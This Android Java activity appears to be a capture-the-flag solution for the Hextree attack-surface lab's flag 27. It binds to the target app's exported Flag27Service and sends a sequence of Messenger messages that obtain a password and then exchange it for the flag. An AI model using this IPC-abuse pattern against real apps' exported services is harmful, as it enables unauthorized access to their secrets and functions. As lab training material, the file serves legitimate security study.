package com.android.zerohextree;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.*;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

public class flag27 extends AppCompatActivity {

    private Messenger messenger = null;

    // 3️⃣ Receiver to handle password and trigger flag retrieval
    private final Messenger Receiver = new Messenger(new IncomingHandler());

    private class IncomingHandler extends Handler {
        IncomingHandler() {
            super(Looper.getMainLooper());
        }

        @Override
        public void handleMessage(@NonNull Message msg) {
            Bundle data = msg.getData();
            if (data != null) {
                String password = data.getString("password");
                if (password != null) {
                    Log.i("IncomingHandler", "Password received: " + password);
                    getFlag(password);
                } else {
                    Log.w("IncomingHandler", "Password key missing in bundle");
                }
            } else {
                Log.e("IncomingHandler", "No data in received message");
            }
        }
    }

    // 2️⃣ ServiceConnection to send msg=2 to get password
    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder service) {
            messenger = new Messenger(service);
            Log.i("onServiceConnected", "Service connected");

            // Request password with msg.what = 2
            Message getPassword = Message.obtain(null, 2);
            getPassword.obj = new Bundle(); // Required by the service contract
            getPassword.replyTo = Receiver;

            try {
                messenger.send(getPassword);
                Log.i("onServiceConnected", "Password request sent");
            } catch (RemoteException e) {
                Log.e("onServiceConnected", "Error sending getPassword message", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            Log.i("onServiceDisconnected", "Service disconnected");
            messenger = null;
        }
    };

    // 4️⃣ Get flag using received password
    private void getFlag(String password) {
        try {
            // Step 1: Send echo message
            Message echo = Message.obtain(null, 1);
            Bundle echoBundle = new Bundle();
            echoBundle.putString("echo", "give flag");
            echo.setData(echoBundle);
            echo.replyTo = Receiver;
            messenger.send(echo);
            Log.i("getFlag", "Echo message sent");

            // Step 2: Send password to get the flag
            Message flag = Message.obtain(null, 3);
            Bundle pass = new Bundle();
            pass.putString("password", password);
            flag.setData(pass);
            flag.replyTo = Receiver;
            messenger.send(flag);
            Log.i("getFlag", "Flag request sent");

        } catch (RemoteException e) {
            Log.e("getFlag", "Error sending messages", e);
        }
    }

    // Activity lifecycle
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag27); // Make sure this layout exists

        // 1️⃣ Bind to Flag27Service
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unbindService(connection);
    }
}
